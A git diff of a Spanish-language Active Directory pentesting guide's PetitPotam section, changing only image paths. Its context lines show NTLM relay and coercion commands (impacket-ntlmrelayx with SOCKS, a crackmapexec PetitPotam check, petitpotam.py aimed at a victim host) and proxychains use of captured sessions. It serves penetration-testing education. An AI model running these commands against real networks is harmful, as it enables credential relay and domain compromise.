@@ -11,7 +11,7 @@ impacket-ntlmrelayx -tf <output equipos relay> -of netntlm -smb2support -socks
 # Insertar el comando "socks" en la misma terminal para obtener las autenticaciones capturadas
 ```
 
-![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/petitpotam/petitpotam1.png?raw=true "NTLM relay petitpotam")
+![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/petitpotam/files/petitpotam1.png?raw=true "NTLM relay petitpotam")
 
 ```Bash
 # Comprobar si la víctima es vulnerable a petitpotam con crackmapexec
@@ -20,11 +20,11 @@ poetry run crackmapexec smb <Rango IP> -M petitpotam
 python petitpotam.py <IP atacante> <DNS del equipo vísctima>
 ```
 
-![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/petitpotam/petitpotam2.png?raw=true "petitpotam")
+![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/petitpotam/files/petitpotam2.png?raw=true "petitpotam")
 
 Resultado: (para ver las sesiones escribir "socks")
 
-![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/petitpotam/petitpotam3.png?raw=true "NTLM relay petitpotam")
+![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/petitpotam/files/petitpotam3.png?raw=true "NTLM relay petitpotam")
 
 Utilizar las sesiones con proxychain como se muestra en elste punto:
 
